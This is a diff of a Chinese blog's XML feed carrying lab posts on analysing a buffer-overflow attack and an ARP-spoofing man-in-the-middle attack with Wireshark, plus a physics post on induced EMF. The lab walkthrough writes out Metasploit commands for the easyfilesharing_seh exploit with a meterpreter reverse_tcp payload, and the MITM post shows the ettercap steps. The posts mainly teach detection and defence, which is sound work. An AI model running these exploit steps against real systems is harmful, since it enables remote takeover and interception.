+<p>笔者的 8GB 主机基本要把所有的进程关闭 😭</p>
+</blockquote>
+<p>kali：192.168.93.144<br>
+Win7：192.168.93.155<br>
+Wireshark 监听端口 VNet8<br>
+文件共享软件 Easy File Sharing Web Server7.2</p>
+<h2 id="实验步骤">实验步骤</h2>
+<h3 id="开启服务">开启服务</h3>
+<p>在 Win 7 下运行 文件共享软件 Easy File Sharing Web Server7.2：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image001.png" alt></p>
+<p>开启服务之后，另一台主机 kali 是可以访问的：</p>
+<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002.png" alt></p>
+<h3 id="缓冲区溢出攻击">缓冲区溢出攻击</h3>
+<p>在 kali 中执行 msfconsole 命令打开 Metasploit：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image003.png" style="zoom:80%;"></p>
+<p>Metasploit 是各种渗透模块的集成，先搜索一下没有没目标软件的渗透模块：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image004.png" alt></p>
+<p>我们不妨使用 2015 版的：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/http/easyfilesharing_seh</span><br></pre></td></tr></table></figure>
+<p>然后进行攻击</p>
 <ol>
-<li>攻击者用 ARP 协议对网络进行扫描</li>
-<li>计算机感染了 ARP 病毒，破坏网络通信</li>
-<li>用攻击者发动 ARP 欺骗，发动中间人攻击（e.g. 密码丢失，十有八九是 ARP 欺骗）</li>
+<li>
+<p>选择武器</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>自我定位</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lhost 192.168.93.144</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>目标定位</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set rhost 192.168.93.155</span><br><span class="line">set rport 80</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>攻击<br>
+发送大量数据，包括木马等，实现缓冲区溢出</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203002353.png" alt="image-20200705203002353"></p>
+</li>
 </ol>
-<h2 id="Wireshark-专家系统">Wireshark 专家系统</h2>
-<blockquote>
-<p>结束捕获状态的时候才可用。</p>
-</blockquote>
-<p>在状态栏的最左侧黄色的按钮：</p>
-<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629180002310.png" alt="image-20200629180002310"></p>
-<p>Wireshark 专家系统分析出了几个疑点：<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175909336.png" alt="image-20200629175909336"></p>
-<p>其中 Duplicate IP …… 对应了刚刚三个可能性中的：ARP 欺骗。</p>
-<blockquote>
-<p>实际工作不能过度依赖专家系统，它主要是针对 TCP 故障分析的。</p>
-</blockquote>
-<h2 id="深入分析">深入分析</h2>
-<p>接下来根据之前摸索到的信息去追踪实施 ARP 欺骗的攻击者。<br>
-攻击者有这样几个特征：</p>
+<p>这个时候已经实现了对 Win7 的控制。</p>
+<h3 id="控制">控制</h3>
+<p>接下来可以把 Win7 当做自己的主机进行控制：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image006.png" alt></p>
+<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image007.png" alt></p>
+<h1>使用 Wireshark 分析缓冲区溢出攻击</h1>
+<h2 id="判定攻击">判定攻击</h2>
+<p>如果我们怀疑自己中了缓冲区溢出攻击，可以进行如下分析：<br>
+分析 <a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/tree/master/Package/Buffer_Overflow.pcapng" target="_blank" rel="noopener">Buffer_Overflow.pcapng</a>：</p>
+<p>先用显示过滤器过滤一下，只显示 http 相关的报文（客户端进行缓冲区溢出攻击的应用层协议）<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203021763.png" alt></p>
+<p>首先 Wireshark 已经看出来这里是一个畸形的数据包。并且，HTTP 数据包进行了分片，这往往是字段内容过大导致的，也是实现缓冲区溢出攻击的必要条件之一。</p>
+<p>我们可以用 TCP 在追踪流查看一下：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png" alt></p>
+<p>可以很明显地看出 GET 后面的内容是混乱的， 没有没有实际意义可言，并且有很长很长一大段全是字符。<br>
+这很显然是为了将软件的缓冲区填满。</p>
+<h2 id="一个疑点的分析">一个疑点的分析</h2>
+<p>值得一提的是，如果你尝试在 Easy File Sharing Web Server 页面填写内容的时候，会发现自己输出长度是有限的，那怎么会导致溢出呢？<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image010.png" alt><br>
+这一点其实并不难理解，这个功能实现往往是前端页面对用户输入的限制。但是传输的时候没有限制，比如通过 Socket 编程传递这样过长的参数。<br>
+再补充一下，我们这里是用 Metasploit 中的模块实现对软件的攻击，也就意味着这个漏洞是公开知晓的。但是自己去挖漏洞的时候，就需要自己用诸如 Socket 编程的方式进行攻击。</p>
+<p>所以这里的软件是有问题的，漏洞在于不检查接收的数据有多长，只是在前端做了输入限制。<br>
+当传出的数据大于 TCP 的缓冲区，就会复制到缓冲区的外面，通俗地讲就是指向下一条要执行指令的指针（PC）指针。导致之后执行的时候，不是执行下一条程序，而是执行下一个木马。</p>
+<h2 id="缓冲区大小">缓冲区大小</h2>
+<p>程序缓冲区有多大，这个是一个非常非常关键的问题，对不同的人都有非常重要的意义。<br>
+黑客知晓之后，就可以进行攻击了，在缓冲区之外的加上木马文件，构造缓冲区溢出攻击；<br>
+安全工作者知晓之后，可以进行木马识别和网络取证等。</p>
+<p>而我们这里其实也可以看到：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png" alt><br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image011.png" style="zoom:50%;"></p>
+<p>这个程序的缓冲区大小为：4061 bytes.</p>
+<h2 id="反向木马">反向木马</h2>
+<p>按照木马客户端和服务端之间建立连接的方式的不同，可以将木马分为正向连接木马和反向连接木马。</p>
+<p>正向连接木马的连接过程为：控制端首先发起通信连接的请求，然后木马被控制端响应并建立半连接，等控制端响应后，木马被控制端最终建立一个与控制端的通信连接。<br>
+正向木马其实是比较困难，黑客不知道哪些主机中了木马，而中了木马的主机等待着黑客连接它。</p>
+<p>再加上由于动态IP、防火墙过滤技术、内网访问限制等因素的存在，阻挡了许多木马的交互，使得中了木马的计算机无法与控制端联系。这样，反向连接方式就显得非常必要。</p>
+<p>进一步说，灰鸽子木马之后，常见的木马基本上都是反向木马。</p>
+<p>其连接过程是：控制端首先打开端口进行监听，被控制端主动与控制端的监听端口进行连接。木马控制端发现被控制端请求之后给出提示，然后控制者开始对被控制端主机进行控制操作。</p>
+<p>我们分析一下这里是不是反向木马。<br>
+这里的服务器 IP 是 192.168.93.155，所以先用一次显示过滤器：<br>
+ip.src == 192.168.93.155<br>
+看到有一个它主动发出的 SYN 请求：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203053290.png" alt="image-20200705203053290"></p>
+<p>去掉显示过滤器，可以看到服务器主动和另一台主机进行 TCP 三次握手：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image013.png" alt></p>
+<p>所以这里攻击者使用的是反向木马。</p>
+<h2 id="应对措施">应对措施</h2>
+<p>如果你使用的软件存在这样的漏洞，但你又不得不使用这个软件，可以这样应对：<br>
+把特征写入入侵检测的特征库里，比如我们这里的特征是： HTTP GET请求, 缓冲区长度为 4061 bytes…</p>
+<h1>参考资料</h1>
 <ol>
-<li>发送大量的 ARP reply<br>
-用大数量淹没正确单个的 ARP reply.</li>
-<li>一个 MAC 对应两个 IP（中间人）</li>
+<li><a href="http://www.cnitpm.com/pm1/66204.html" target="_blank" rel="noopener">正向连接</a></li>
+<li><a href="http://www.cnitpm.com/pm1/66205.html" target="_blank" rel="noopener">反向连接</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">缓冲区溢出</a></li>
 </ol>
-<p>应用显示过滤器之后，可见：<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175918531.png" alt="image-20200629175918531"></p>
-<p>上面是两个正常的 ARP reply<br>
-下面同一个 MAC 重复地发送 ARP reply，且用两个 IP 回复。<br>
-APR 欺骗实施者，无疑。</p>
-<h1>防御中间人攻击</h1>
-<p>有四种常见的方法：</p>
-<ol>
-<li>将网关的ARP 映射关系进行静态绑定 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -s ip_addr mac_addr</span><br></pre></td></tr></table></figure>
-不适合大型网络（且重启就没有了，可能要在注册表里面找）</li>
-<li>使用 DHCP     Snooping 功能</li>
-<li>划分 VLAN<br>
-但是不可能一个人一个 VLAN，所以在一个 VLAN 内还是有风险。</li>
-<li>ARP防火墙<br>
-本身也很消耗资源</li>
-</ol>
-<blockquote>
-<p>所以，目前没有完美的方案。</p>
-</blockquote>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -1253,7 +1248,6 @@ APR 欺骗实施者，无疑。</p>
       <tags>
         <tag>kali</tag>
         <tag>Wireshark</tag>
-        <tag>eNSP</tag>
       </tags>
   </entry>
   <entry>
@@ -1384,6 +1378,245 @@ APR 欺骗实施者，无疑。</p>
       <tags>
         <tag>Powershell</tag>
         <tag>life</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【Wireshark 系列】中间人攻击分析</title>
+    <url>/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p><img src="https://www.zer0-nu1l.com/uploads/Wireshark.jpg" alt="Wireshark"></p>
+<p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种非常高效（基本没有失败的可能）的攻击。<br>
+中间人攻击的目标并不是交换机，而是终端设备（例如计算机、手机等）。<br>
+所以我没有在上一篇 <a href="https://www.zer0-nu1l.com/2020/06/28/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91MAC%20%E5%9C%B0%E5%9D%80%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">【Wireshark 系列】MAC 地址泛洪攻击分析</a> 里面讲这部分的内容 😃</p>
+  <a id="more"></a>
+<h1>中间人攻击的相关理论</h1>
+<h2 id="ARP-缓存表-与-ARP报文分析">ARP 缓存表 与 ARP报文分析</h2>
+<p>在每一台终端设备中都有一个 ARP 缓存表，这个表中保存了一些 IP 地址和 MAC 地址之间的映射关系。<br>
+windows/Linunx 查看本台设备 ARP 表的命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+<p>删除 ARP 表的命令（需要管理员权限）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -d</span><br></pre></td></tr></table></figure>
+<p>由于我们的电脑大部分时间都会和外进行通信，所以如果执行了删除 ARP 表的命令，它会很快进行ARP的请求，重新获得 Mac地址和 IP 的映射关系。</p>
+<p>我们可以利用这个特性，监听网卡，执行删除 ARP 表的命令，即可获得 ARP 请求和 ARP 响应的报文：<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/ARP.pcapng" target="_blank" rel="noopener">ARP.pcapng</a>。</p>
+<h2 id="ARP-报文分析">ARP 报文分析</h2>
+<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175524589.png" alt="image-20200629175524589"></p>
+<p>ARP 报文非常非常简单，只有两个类型：一个 ARP 请求，一个 ARP 响应。<br>
+我们详细看下它的内容：</p>
+<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175539195.png" alt="image-20200629175539195"></p>
+<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175553893.png" alt="image-20200629175553893"></p>
+<p>Opcode 只有 1 和 2，1是请求，2是应答。<br>
+对应的，我们可以设置显示过滤器：arp.opcode == 2 或者 arp.opcode == 1<br>
+ARP 报文缺点：没有验证措施，所以容易伪造<br>
+由于 ARP 协议非常简单，所以在通信过程中 ARP 协议占比通常非常低，几乎可以忽略不计。如果占比高，很可能就是出现了异常情况。</p>
+<h2 id="ARP-欺骗">ARP 欺骗</h2>
+<p>ARP 欺骗是实现 MITM 攻击的一种常用手段。<br>
+可以网上似乎到处都是，而且计算机网络课程也应该提到过，这里就不再多少。</p>
+<h1>发起中间人攻击</h1>
+<h2 id="常见攻击方式">常见攻击方式</h2>
+<p>以前我们提到，ARP 协议没有验证措施，所以黑客可以冒充设备，甚至可以冒充网关……<br>
+一旦冒充了网关，目标主机就会将所有对外通信的报文给中间人，中间人再发给网关，信息一览无余……</p>
+<h2 id="情景介绍">情景介绍</h2>
+<p>下面使用 kali 虚拟机作为中间人攻击的实施者，Metasploitable 虚拟机作为被攻击的目标（为什么选他？因为它没有 GUI 省内存 😭）<br>
+虚拟机的网关为 192.168.93.2, Metasploitable 的 IP 是 192.168.93.145</p>
+<blockquote>
+<p>我暂居的地方马上迁移了，不要来毒化我哈 😅</p>
+</blockquote>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175611372.png" alt="image-20200629175611372" style="zoom:80%;">
+<h2 id="实施-ARP-攻击">实施 ARP 攻击</h2>
+<p>下面使用一款非常简单好用的工具 ettercap（实现 ARP 欺骗的工具很多，这是一款有 GUI 的工具）。<br>
+选择通用的嗅探：<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175628221.png" alt="image-20200629175628221"></p>
+<p>这时候多了很多选项：<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175723728.png" alt="image-20200629175723728"></p>
+<p>先进行扫描主机：<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175727750.png" alt="image-20200629175727750"></p>
+<p>然后查看 Hosts List<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175734405.png" alt="image-20200629175734405"></p>
+<p>分别选择两个目标（网关和攻击目标）<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175740006.png" alt="image-20200629175740006"></p>
+<p>然后执行 MITM<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175745093.png" alt="image-20200629175745093"></p>
+<p>之后这台机器于外界通信的数据包都会被我看到：<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/MITM.pcapng" target="_blank" rel="noopener">MITM.pcapng</a></p>
+<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175807246.png" alt="image-20200629175807246"></p>
+<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175810833.png" alt="image-20200629175810833"></p>
+<p>我们再做一件有趣的事情：我用 scp 从 WSL 发一张照片给 msfadmin</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp ./sydney.jpg msfadmin@192.168.93.145:~/</span><br></pre></td></tr></table></figure>
+<p>然后在 kali 追踪 TCP 流，看看能否得到图片<br>
+<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/MITM_picture.pcapng" target="_blank" rel="noopener">MITM_picture.pcapng</a><br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175834142.png" alt="image-20200629175834142"></p>
+<p>SSH 经过了数据的加密，所以没有办法查看原来传输的数据。</p>
+<h1>分析中间人攻击</h1>
+<p>接下来我们将通过分析刚刚抓到的包，讲解 MITM 攻击的特点，以便我们自己在其他场景下判断、分辨 MAC 泛洪攻击。<br>
+<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/MITM.pcapng" target="_blank" rel="noopener">MITM.pcapng</a></p>
+<h2 id="初看">初看</h2>
+<p>频繁出现 ARP 是不正常的（一般一应一答就结束了）<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175858516.png" alt="image-20200629175858516"></p>
+<p>协议分级看一下：<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175903200.png" alt="image-20200629175903200"></p>
+<p>ARP 协议报文在这么大的数据包中，平常接近 0.0%，这里高达 8.6%！</p>
+<p>遇到这样情况，通常有三种可能：</p>
+<ol>
+<li>攻击者用 ARP 协议对网络进行扫描</li>
+<li>计算机感染了 ARP 病毒，破坏网络通信</li>
+<li>用攻击者发动 ARP 欺骗，发动中间人攻击（e.g. 密码丢失，十有八九是 ARP 欺骗）</li>
+</ol>
+<h2 id="Wireshark-专家系统">Wireshark 专家系统</h2>
+<blockquote>
+<p>结束捕获状态的时候才可用。</p>
+</blockquote>
+<p>在状态栏的最左侧黄色的按钮：</p>
+<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629180002310.png" alt="image-20200629180002310"></p>
+<p>Wireshark 专家系统分析出了几个疑点：<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175909336.png" alt="image-20200629175909336"></p>
+<p>其中 Duplicate IP …… 对应了刚刚三个可能性中的：ARP 欺骗。</p>
+<blockquote>
+<p>实际工作不能过度依赖专家系统，它主要是针对 TCP 故障分析的。</p>
+</blockquote>
+<h2 id="深入分析">深入分析</h2>
+<p>接下来根据之前摸索到的信息去追踪实施 ARP 欺骗的攻击者。<br>
+攻击者有这样几个特征：</p>
+<ol>
+<li>发送大量的 ARP reply<br>
+用大数量淹没正确单个的 ARP reply.</li>
+<li>一个 MAC 对应两个 IP（中间人）</li>
+</ol>
+<p>应用显示过滤器之后，可见：<br>
+<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175918531.png" alt="image-20200629175918531"></p>
+<p>上面是两个正常的 ARP reply<br>
+下面同一个 MAC 重复地发送 ARP reply，且用两个 IP 回复。<br>
+APR 欺骗实施者，无疑。</p>
+<h1>防御中间人攻击</h1>
+<p>有四种常见的方法：</p>
+<ol>
+<li>将网关的ARP 映射关系进行静态绑定 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -s ip_addr mac_addr</span><br></pre></td></tr></table></figure>
+不适合大型网络（且重启就没有了，可能要在注册表里面找）</li>
+<li>使用 DHCP     Snooping 功能</li>
+<li>划分 VLAN<br>
+但是不可能一个人一个 VLAN，所以在一个 VLAN 内还是有风险。</li>
+<li>ARP防火墙<br>
+本身也很消耗资源</li>
+</ol>
+<blockquote>
+<p>所以，目前没有完美的方案。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>Wireshark</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>Wireshark</tag>
+        <tag>eNSP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在电流强度变化的直导线产生的磁场中任意形状线框运动产生电动势</title>
+    <url>/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<h1>背景介绍</h1>
+<p>在第十二章节变化的电磁场中计算感生电动势中遇到一道题目中包含比较复杂的数学计算，想通过自己的理论推导和借助计算机的算力将同类问题进行推广、借助计算机计算分析。</p>
+<a id="more"></a>
+<p>原题如下：</p>
+<p>例12-8 长直导线中通有电流 $I=I_0 · cos t (I_0 常量)$ 。有一与之共面的三角形线圈 ABC,已知 AB=a, BC=b。若线圈以垂直于导线方向的速度 v 向右平移, 当 B 点与长直导线的距离为 x 时,求线圈 ABC 中的感应电动势。(如图1所示)</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601203930603.png" alt="image-20200601203930603"></p>
+<center>图1</center>
+<p>解：<br>
+将三角形沿竖直方向分为若干宽为 $dr$ 的矩形积分。<br>
+$$<br>
+\begin{aligned}<br>
+\varphi_m &amp;= \int_x^{x + b}{\frac{\mu _oI}{2\pi r}}\left( x+b-r \right) \frac{a}{b}{d}r<br>
+\\<br>
+&amp;= \frac{\mu _oa}{2\pi b}I\cdot \left[ \left( x+b \right) \ln \frac{x + b}{x}-b \right]<br>
+\end{aligned}<br>
+$$</p>
+<p>$$<br>
+\varepsilon_i = -\frac{ d \varphi_m}{dt}<br>
+$$</p>
+<p>$$<br>
+I=I_0 cos \left( {t} \right) , \frac{dx}{dt} = v<br>
+$$</p>
+<p>$$<br>
+\begin{aligned}<br>
+\varepsilon_i<br>
+&amp;= - \frac{\mu_o a}{2 \pi b} \left\{ \frac{dI}{dt} \left[ \left( x+b \right) \ln \frac{x + b}{x} - b \right] +I \frac{d}{dt} \left[ \left( x+b \right) \ln \frac{x + b}{x}-b \right] \right\}<br>
+\\<br>
+&amp;= \frac{\mu_o a I_o \omega }{2 \pi b} \sin \omega t \left[ \left( x+b \right) \ln \frac{x + b}{x} - b \right] +\frac{\mu _o a v}{2 \pi b}I_o \cos \omega t \left( -\ln \frac{x + b}{x} + \frac{b}{x} \right)<br>
+\end{aligned}<br>
+$$</p>
+<h1>猜想和计算推导</h1>
+<h2 id="思路分析">思路分析</h2>
+<p>我们发现这个电动势的计算结果中与α无关，这意味着只要保持三角形的高不变，将顶点C沿着平行于AB的方向移动，就不会改变对应的电动势，这是实现推广到任意形状的线框的基础。</p>
+<p>本例如果借助编程语言，最关键的并不是我们手算时遇到的数学上的困难（积分，求导时x和I都是t的函数，需要用对应的求导法则），这里的数学问题可以用MATLAB轻松解决，这里为了一元化，从数学计算到数据可视化，再到GUI界面展示，都是用Python。所以这里没有使用MATLAB，而用了Python的SymPy。</p>
+<p>所以现在求电动势式对t求导已经不再是我们遇到最麻烦的问题，推广到任意形状的关键是在任意形状的线框在磁场内的磁通量的求解上。</p>
+<h2 id="推广到梯形">推广到梯形</h2>
+<p>我们可以先把三角形推广到梯形。</p>
+<p>需要分两种情况：一种是梯形的底离直导线更近，一种是梯形的底离直导线更近更远；</p>
+<p>1、梯形的底离直导线更近的情况如图2所示</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601203951198.png" alt="image-20200601203951198"></p>
+<center>图2</center>
+<p>2、梯形的底离直导线更远的情况如图3所示</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204023480.png" alt="image-20200601204023480"></p>
+<center>图3</center>
+<p>类似于我们在例12-8中发现，在梯形中电动势的计算结果中与α无关，这意味着只要保持梯形的高不变，将梯形的平行的两条边C沿着平行的方向移动，就不会改变对应的电动势。</p>
+<p>于此基础上，我们可以把任意的多边形分割成若干个梯形，其中梯形分成两种，一种是梯形的底离直导线更近的梯形，一种是梯形的底离直导线更近更远的梯形。</p>
+<h2 id="用程序计算特定形状对应的电动势和进一步推广解释">用程序计算特定形状对应的电动势和进一步推广解释</h2>
+<p>我们用程序分别对正三角形、正方形、正五边形、正六边形、正七边形在电流强度变化的直导线产生的磁场中任意形状线框运动产生电动势。从中解释任意性。</p>
+<p>正三角形、正方形直接套用情形1（注意a, b, c对应梯形情形中的a, b, c），矩形分析如图4 所示，程序运行结果见图5 、图6。</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204413252.png" alt="image-20200601204413252"></p>
+<center>图4</center>
